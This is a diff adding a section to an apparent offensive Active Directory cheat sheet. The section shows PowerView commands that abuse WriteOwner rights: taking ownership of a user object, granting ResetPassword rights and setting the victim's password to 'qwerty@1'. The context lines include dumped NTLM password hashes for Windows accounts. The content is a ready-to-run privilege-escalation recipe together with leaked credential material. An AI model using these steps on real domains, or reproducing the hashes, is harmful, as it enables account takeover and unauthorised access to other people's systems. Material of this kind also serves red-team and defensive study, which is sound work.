@@ -999,6 +999,20 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6
 user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
 admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
 ```
+## AD Writeowner ACL 
+
+ex: User Tom has writeowner rights over claire
+
+```bash
+
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> . .\PowerView.ps1                                                                  
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -identity claire -OwnerIdentity tom                          
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword                                     
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> $cred = ConvertTo-SecureString "qwerty@1" -AsPlainText -force                      
+PS C:\Users\tom\Desktop\AD Audit\BloodHound>                                                                                    
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $cred                     
+PS C:\Users\tom\Desktop\AD Audit\BloodHound>    
+```
 
 ## DNSadmin abuse
 
